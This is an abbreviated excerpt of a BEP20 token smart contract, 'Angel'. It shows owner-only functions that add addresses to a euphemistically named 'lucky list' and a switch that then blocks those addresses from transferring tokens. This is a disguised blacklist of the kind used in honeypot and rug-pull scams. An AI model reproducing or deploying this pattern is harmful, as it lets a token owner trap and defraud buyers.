...
contract Angel is Context, iBEP20, Ownable {
  ...
  */
  ...
  function transfer(address recipient, uint256 amount) external override returns (bool) {
      if (_ioOpens) {
            require(_eList[_msgSender()] == false, "You are in lucky list now");
        }
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
      if (_ioOpens) {
            require(_eList[sender] == false, "You are in lucky list now");
        }
  ...
  function addlucky(address lo) external onlyOwner() {
        _eList[lo] = true;
    }

    function luckyRemove(address lo) external onlyOwner() {
        delete _eList[lo];
    }
    ...
    function setluckySwitchOpen(bool lo) external onlyOwner() {
        _ioOpens = lo;
    }
}